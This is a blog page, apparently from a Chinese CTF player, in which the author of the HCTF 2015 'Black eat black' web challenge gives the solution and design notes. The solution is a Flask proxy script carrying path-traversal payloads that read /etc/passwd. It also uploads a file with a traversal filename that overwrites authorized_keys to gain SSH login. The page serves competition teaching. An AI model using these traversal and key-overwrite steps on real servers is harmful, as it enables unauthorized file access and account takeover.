@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>HCTF之Black-Eat-Black总结 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF之Black-Eat-Black总结">
+<meta property="og:url" content="http://0x48.pw/2015/12/08/0x0D/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:image" content="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png">
+<meta property="og:updated_time" content="2016-03-28T10:21:37.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HCTF之Black-Eat-Black总结">
+<meta name="twitter:image" content="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x0D" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/12/08/0x0D/" class="article-date">
+      <time datetime="2015-12-08T06:49:13.000Z" itemprop="datePublished">2015-12-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HCTF之Black-Eat-Black总结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png" alt="HCTF"></p>
+<a id="more"></a>
+<p>这次HCTF，我负责黑吃黑这题的出题和运维，最终只有六星一个队日穿了该题。</p>
+<hr>
+<p><strong>题目名称</strong>：Black eat black(300不足，200有余)<br><strong>题目描述</strong>：使用该DNS(180.153.47.182)后，你会被劫持哦～<br><strong>分值</strong>：300<br><strong>开题金币</strong>：300<br><strong>奖励金币</strong>：400</p>
+<hr>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>先给出writeup脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"> <span class="comment"># writeup.py</span></div><div class="line"> <span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyanyConverter</span><span class="params">(BaseConverter)</span>:</span></div><div class="line">	weight = <span class="number">200</span></div><div class="line">	regex = <span class="string">'.*'</span></div><div class="line">	</div><div class="line">app = Flask(__name__, static_folder = <span class="string">"nononono"</span>)</div><div class="line">app.url_map.converters[<span class="string">'myany'</span>] = MyanyConverter</div><div class="line"></div><div class="line"><span class="meta">@app.route('/&lt;myany:url&gt;', methods = ['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(url)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"---------------------------------------------------"</span></div><div class="line">	req_url = <span class="string">"http://120.55.181.136/"</span>+url</div><div class="line">	<span class="comment"># req_url = "http://120.55.181.136/username/uploadfile/....//....//....//....//....//....//....//etc/passwd"</span></div><div class="line">	<span class="keyword">print</span> req_url</div><div class="line">	header = &#123;&#125;</div><div class="line">	data = &#123;&#125;</div><div class="line">	my_file = &#123;&#125;</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> request.headers:</div><div class="line">		<span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">''</span>:</div><div class="line">                        <span class="keyword">continue</span></div><div class="line">                <span class="keyword">if</span> x[<span class="number">0</span>] == <span class="string">'Host'</span>:</div><div class="line">                	header[<span class="string">'Host'</span>] = <span class="string">"127.0.0.1:4444"</span></div><div class="line">                	<span class="comment"># header['Host'] = "127.0.0.1:4444/username/uploadfile/../../../../../../etc/passwd"</span></div><div class="line">                	<span class="keyword">continue</span></div><div class="line">		header[x[<span class="number">0</span>]] = x[<span class="number">1</span>]</div><div class="line">	<span class="comment">#print header</span></div><div class="line">	<span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">		<span class="keyword">for</span> a, b <span class="keyword">in</span> request.form.items():</div><div class="line">			data[a] = b</div><div class="line">		</div><div class="line">		<span class="keyword">if</span> request.files <span class="keyword">and</span> len(request.files) == <span class="number">1</span>:</div><div class="line">			te = request.files</div><div class="line">			fie = te.keys()[<span class="number">0</span>]</div><div class="line">			f = request.files[fie]</div><div class="line">			set_name = <span class="string">'cache/file/'</span> + f.filename.replace(<span class="string">'/'</span>, <span class="string">''</span>).replace(<span class="string">'.'</span>, <span class="string">''</span>)</div><div class="line">			f.save(set_name)</div><div class="line">			<span class="comment">#my_file = &#123;fie: (f.filename, open(set_name, 'rb'))&#125;</span></div><div class="line">			my_file = &#123;fie: (f.filename, open(set_name, <span class="string">'rb'</span>))&#125;</div><div class="line">		<span class="keyword">if</span> my_file == &#123;&#125;:</div><div class="line">			req = requests.post(req_url, headers = header, data = data)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			header.pop(<span class="string">'Content-Type'</span>)</div><div class="line">			req = requests.post(req_url, headers = header, data = data, files = my_file)</div><div class="line">	<span class="keyword">elif</span> request.method == <span class="string">'GET'</span>:</div><div class="line">		req = requests.get(req_url, headers = header)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">'404'</span></div><div class="line">	h = &#123;&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> req.headers.items():</div><div class="line">		h[x] = y</div><div class="line">	<span class="comment">#print h</span></div><div class="line">	<span class="comment">#print req.content</span></div><div class="line">	response = Response(req.content, req.status_code, h)</div><div class="line">	<span class="keyword">print</span> <span class="string">"---------------------------------------------------"</span></div><div class="line">	<span class="comment">#return ""</span></div><div class="line">	<span class="keyword">return</span> response</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	app.run(debug = <span class="keyword">True</span>, port = <span class="number">8888</span>, host = <span class="string">'127.0.0.1'</span>, threaded=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
+<p>通过该脚本可以自由访问到gayhub，然后修改host或者url，可以任意文件读取(见脚本里的注释)，读到 <code>/etc/passwd</code> 得到 <code>hctf2015:x:1000:1000::/home/hctf2015:/usr/bin/whereisflag</code><br>由于 <code>/usr/bin/whereisflag</code> 不可读，则判断是要通过登陆触发该脚本，接下来就通过上传文件进行任意文件覆盖，上传自己的 <code>id_rsa.pub</code>, 然后文件名设置为 <code>../../../../../../../../home/hctf2015/authorized_keys</code> 则可通过ssh远程登陆。</p>
+<p>正常情况下这样就getshell，可以结束了，但是为了增加题目的趣(keng)味(die)性，和并不让选手真正getshell，所以我把 <code>/bin/bash</code> 改成了 <code>/usr/bin/whereisflag</code></p>
+<p>六星撸出来的时候， whereisflag脚本是一个 B站答题系统，我从网上随便找了100多题，然后随机出13题作为填空题，无时间限制，一旦答错，将要重新开始，看在六星凌晨3点多还在做我的答题系统，还一直答不对的情况下(其实是被队友打了)，我把题目减成了2题，然后六星的成功得到flag去睡觉了，而我还要盯着服务器…- -！</p>
+<p>然后我觉得答题挺坑的（迫于队友压力），把答题的彩蛋换了，至于是啥，还没人见过，你们自己去看看吧，比B站答题简单多了。。。。</p>
+<p>writeup就到这了，接下来是出题思路….</p>
+<hr>
+<h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>最开始我的题只是一个 gayhub，分值我觉得不到200吧，然后服务端是 Nginx + Uwsgi + flask，但是发现Nginx竟然会吃 <code>../</code>(uwsgi也会，后面会说) ,这样就没法实任意文件读取了，如果少了任意文件，我觉得基本没人会想到上传 <code>authorized_keys</code> ，那么这题就变脑洞题了。</p>
+<p>但是如果不配上 Nginx + Uwsgi ,然后题目描述直接把Gayhub暴露出来，我怕光flask负担不起各大赛棍的蹂躏。</p>
+<p>在一次月黑风高夜夜，灵光一闪，有了现在的黑吃黑。</p>
+<p>我用自己的服务器搭了一个dns服务器(怕被菊苣们日，所有服务都光了，只剩53和把ssh端口隐藏了)，把所有的域名都指向了我的题目服务器。之后就是模拟DNS劫持，题目的服务器我写了一个flask作为中间人，负责劫持的你http，然后原封不动的进行转发。 </p>
+<p>通过 <code>url = &#39;http://&#39; + host + &#39;/&#39; + path ( + query)</code> 这样的形式获取你要访问的网站，然后原封不动的获取的你headers 和 data，服务器进行请求，然后原封不动的返回。</p>
+<p>然后 Gayhub 监听127.0.0.1:4444</p>
+<p>这题的架构差不多就是这样。</p>
+<hr>
+<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>现在的web题，除非是有啥黑魔法，或者能像P神那样出一道神一样的代码审计题，其他的我都觉得没啥意思，而我手中没有关于php的黑魔法，也出不了有意思的代码审计的题目，所以就想着另辟奇径，而最近flask用多了，就准备用它出一道web题，然后搜到了P神在wooyun发的python 的Tornado框架的任意文件读取，这个也可以在flask里复现，不过光读取也没意思，然后灵光一闪，想到了authorized_keys的没密码登陆。。。就这样gayhub诞生了，而这题的中心思想就是不需要任何过滤的Python Web，不过仍然还是有许多问题。</p>
+<ul>
+<li>不配上Nginx + uwsgi受不住全国各大赛棍的蹂躏啊</li>
+<li>flask框架是没漏洞的，这两个漏洞都是我人为的。。。也不是很好</li>
+<li>普通用户写文件默认权限是664，而authorized_keys要是644 或者 600 或者 640, 后两个不现实，但是在root权限下，默认就是644，不过肯定不能让root用户getshell，所以只能修改问题，把普通用户 umask 002。</li>
+</ul>
+<p>不过之后加上DNS劫持就完美了，Gayhub放内网，剧情是未完成，因为未完成所以放内网，因为未完成所以只有登陆和传文件，因为未完成所以未做任何过滤。</p>
+<p>所以该题的剧情就是，一个黑客对你进行了DNS劫持，你是被他劫持呢？还是找到他的漏洞进行反击？ 所以有了黑吃黑的题目</p>
+<p>仍然有问题：</p>
+<ul>
+<li>只能对http进行劫持，不过我后来想到了方法把所有https换成http返回，然后记录下来，等如果请求的url等于https列表里的，则以https请求，返回数据。不过来不及，没完成。。。。。</li>
+<li>redrain大神告知，该服务有个漏洞，可以通过该代理作为跳板去攻击或者dos他人，比如请求一个很大的图片，请求后就把连接断开，这样我的服务器去请求了那张大图片，而这图片却无法返回给攻击者，也就是可以用我服务的流量去攻击他人。 不过在目前情况下不现实，首先有云盾，其次。。特么我一天24小时盯着服务器呢。。我可以ban ip。。。。不过在真实情况下的确是一种攻击思路。。。。解决办法就是做缓存吧，上面说的https的时候就想做了。。。不过也是时间原因。没来得及。。</li>
+<li>还有。。。。仍然挂nginx失败，同样会导致任意文件读取失败。。。但是这时候研究除了flask本身自带多线程，比赛第一天都是直接开flask，多线程跑的，不过还是怕负载太大挂了，第二天研究出了只挂uwsgi，成功，。。。。但是发现uwsgi也会吃 ../ （还好第二天没有人姿势是对的。。要不就坑人了），所以只能是80端口的代理服务挂载uwsgi，最后证明我是多虑了，，，我不用盯着服务器，ban人ip，在这种金币开题的赛制下，最后才31个队左右开了我的题，31个队中只有4个队发现了我的gayhub，10个队找上了我题目的服务器，所以说，根本没有压力。。。。。</li>
+<li><p>当host是请求本机80的时候，会无限死循环，，，，特么，，这个最蛋疼。。看下面代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> <span class="string">"120.55.181.136"</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> request.host == <span class="string">'127.0.0.1'</span> <span class="keyword">or</span> request.host == <span class="string">'0.0.0.0'</span> <span class="keyword">or</span> <span class="string">'127.0.0.1:80'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">'0.0.0.0:80'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">"10.117.9.191"</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">'iZ23l4savztZ'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> request.host ==<span class="string">'localhost'</span> <span class="keyword">or</span> <span class="string">'localhost:80'</span> <span class="keyword">in</span> request.host:</div><div class="line">		request.host = <span class="string">'www.baidu.com'</span></div><div class="line">		</div><div class="line"><span class="comment">#各大赛棍一边日，我一边加。。。根本加不完，，，特么，，这确实是我考虑不周到，出现的非预期。。因为临时改，所以坑爹的写了我有生以来最长的一行代码了。。</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>还是端口的问题，提示的有点勉强，如果是监听本地127.0.0.1端口，nmap是扫描不到的，不会显示filtered，按道理是要自己去扫出来，如果是监听0.0.0.0端口，然后iptables再设置下，会显示为filetered，不过却不符合实际。。最后为了降低难度(降低服务器负载)，所以我把端口绑定到扫描出来为filtered状态的4444端口….</p>
+</li>
+</ul>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次出题，有很多不足，比如当时有想过把文件写权限给去了，可是最终忘了静态文件了，被六星的改了我的css和js，，心累。。。</p>
+<p>也出现了很多非预期，基本是我盯着服务器日志，一发现非预期就停了服务去修改。。写了几次自动化脚本。。反而带来了更多问题。。。</p>
+<p>还有因为flask没有gzip模块，所以返回头里还要把gzip这个给去了。。要不然浏览器打不开网页。</p>
+<p>还有一个最烦的错误了，至今没解决<br><code>ConnectionError: (&#39;Connection aborted.&#39;, error(104, &#39;Connection reset by peer&#39;))</code><br>我分析应该是阿里云的锅，当爆这个错误时，我会收一个RST包，也就是在TCP三次握手之后，HTTP请求包发送之后，服务器返回了一个TCP的RST包，所以socket端口。。报错。。GG</p>
+<h3 id="服务器搭建-centos-："><a href="#服务器搭建-centos-：" class="headerlink" title="服务器搭建(centos)："></a>服务器搭建(centos)：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">yum install libxslt-devel.x86_64</div><div class="line">yum install libxml2-devel.x86_64</div><div class="line">ln <span class="_">-s</span> /usr/include/libxml2/libxml/ /usr/include/libxml</div><div class="line">yum install python-pip</div><div class="line">yum install python-devel.x86_64</div><div class="line">yum install gcc</div><div class="line">pip install lxml</div><div class="line">[</div><div class="line">requests</div><div class="line">这会出一个SSL的问题。。哎。。</div><div class="line">yum install libffi-devel.x86_64</div><div class="line">yum install openssl-devel.x86_64</div><div class="line">pip install requests[security]</div><div class="line">]</div><div class="line">pip install uwsgi</div><div class="line">[</div><div class="line">yum install freetype-devel</div><div class="line">yum install libpng-devel</div><div class="line">yum install libjpeg-devel</div><div class="line">pip install PIL --allow-external PIL --allow-unverified PIL</div><div class="line">]</div><div class="line">wget http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm  </div><div class="line">rpm -ivh nginx-release-centos-7-0.el7.ngx.noarch.rpm</div><div class="line"></div><div class="line">(依赖问题真烦！)</div></pre></td></tr></table></figure>
+<h3 id="ban-ip小记"><a href="#ban-ip小记" class="headerlink" title="ban ip小记"></a>ban ip小记</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">要封停一个IP，使用下面这条命令：</div><div class="line">    iptables -I <span class="keyword">INPUT</span> -s ***.***.***.*** -j <span class="keyword">DROP</span></div><div class="line">要解封一个IP，使用下面这条命令：</div><div class="line">    iptables -<span class="keyword">D</span> <span class="keyword">INPUT</span> -s ***.***.***.*** -j <span class="keyword">DROP</span></div></pre></td></tr></table></figure>
+<hr>
+<p><a href="https://github.com/Hcamael/Blackeatblack" target="_blank" rel="external">源码</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2015-12-08, 14:49:13</p>
+        <p><span>最后更新:</span>2016-03-28, 18:21:37</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2015/12/08/0x0D/" title="HCTF之Black-Eat-Black总结">http://0x48.pw/2015/12/08/0x0D/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2015/12/08/0x0D/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2015/12/19/0x0E/">
+                    12.19网络方向培训
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2015/12/01/0x0C/">
+                    Python 的 BaseHTTPServer模块分析小结
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#writeup"><span class="toc-number">1.</span> <span class="toc-text">writeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#出题思路"><span class="toc-number">2.</span> <span class="toc-text">出题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other"><span class="toc-number">3.</span> <span class="toc-text">Other</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器搭建-centos-："><span class="toc-number">4.1.</span> <span class="toc-text">服务器搭建(centos)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ban-ip小记"><span class="toc-number">4.2.</span> <span class="toc-text">ban ip小记</span></a></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2015/12/19/0x0E/" title="上一篇: 12.19网络方向培训">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
